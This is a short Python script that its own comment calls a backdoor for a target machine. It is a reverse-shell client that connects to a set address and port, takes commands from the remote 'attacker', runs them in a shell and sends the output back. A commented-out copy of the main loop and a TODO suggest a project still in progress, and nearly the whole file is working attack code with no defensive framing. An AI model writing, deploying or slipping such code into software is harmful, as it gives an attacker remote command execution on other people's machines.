#backdoor that runs on target machine


import socket
import json
import os
import sys
import subprocess
import threading
import time



ip = '127.0.0.1'
port = 4141

client = socket.socket()

client.connect((ip, port))
print("connected")

#TODO put getting command in a function (step 3)
def execute_shell():
    while True:
        command = client.recv(1024)
        command = command.decode()
        if command == 'quit':
            break
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        #send response/output back to attacker
        #print(f"sending: {output.decode() + output_error.decode()}")
        print(f"sent output from command: {command}")
        client.send(output + output_error)
        

execute_shell()
# main loop
# while True:
#     #wait for a command from attacker
#     command = client.recv(1024)
#     command = command.decode()
#     op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
#     output = op.stdout.read()
#     output_error = op.stderr.read()
#     #send response/output back to attacker
#     #print(f"sending: {output.decode() + output_error.decode()}")
#     print(f"sent output from command: {command}")
#     client.send(output + output_error)



